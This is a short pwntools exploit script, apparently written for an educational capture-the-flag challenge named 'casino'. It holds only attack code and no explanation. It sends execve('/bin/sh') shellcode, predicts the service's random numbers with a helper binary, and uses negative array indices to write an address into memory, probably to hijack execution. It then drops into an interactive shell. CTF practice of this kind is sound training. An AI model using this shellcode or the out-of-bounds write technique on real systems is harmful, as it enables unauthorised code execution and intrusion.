from pwn import *


r = remote("edu-ctf.csie.org", 10172)
#r = process("./casino")
pre = process("./rand")
rand = pre.recvuntil("\n").decode().strip().split(" ")
pre.close()

r.sendlineafter(":", "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05");

# 0x050f99 
r.sendlineafter("age:", "331673")

for i in range(6):
    r.sendlineafter(":", "1")

r.sendlineafter(":", "1")
r.sendlineafter(":", "-43")
# 0x6020f0
r.sendlineafter(":", "6299888")

for i in range(6):
    r.sendlineafter(":", rand[i])

r.sendlineafter(":", "1")
r.sendlineafter(":", "-42")
r.sendlineafter(":", "0")

r.interactive()
